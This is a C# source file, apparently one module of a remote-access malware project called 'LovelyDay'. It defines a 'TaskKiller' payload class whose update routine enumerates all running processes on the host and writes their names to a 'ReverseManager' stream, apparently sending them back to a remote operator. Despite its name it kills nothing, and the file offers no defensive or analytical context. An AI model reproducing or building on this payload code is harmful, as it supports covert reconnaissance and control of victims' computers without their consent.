using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace LovelyDay
{
    class TaskKiller : IPayload
    {
        public string Name { get; }

        public bool IsEnabled { get; set; }

        public void Start()
        {
            IsEnabled = true;
        }

        public void Stop()
        {
            IsEnabled = false;
        }

        public void Update(float aDeltaTime)
        {
            foreach (Process process in Process.GetProcesses())
            {
                ReverseManager.WriteStream(process.ProcessName);
            }
            IsEnabled = false;
        }
    }
}
